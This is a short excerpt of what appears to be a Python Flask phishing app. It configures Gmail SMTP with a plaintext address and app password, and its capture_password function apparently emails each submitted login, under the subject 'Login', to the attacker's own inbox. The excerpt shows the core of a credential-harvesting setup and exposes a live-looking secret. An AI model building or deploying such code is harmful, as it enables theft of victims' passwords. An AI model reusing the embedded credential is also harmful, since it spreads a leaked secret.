...
app.config['MAIL_USERNAME'] = 'bv.engex@gmail.com '  # Your Gmail address
app.config['MAIL_PASSWORD'] = 'zddccfulfddckuux'   # Your Gmail password or app-specific password
...
def capture_password():
    if request.method == 'POST':
        ...
        recipient =  'bv.engex@gmail.com'  # Your email address to receive the email
        subject = 'Login'
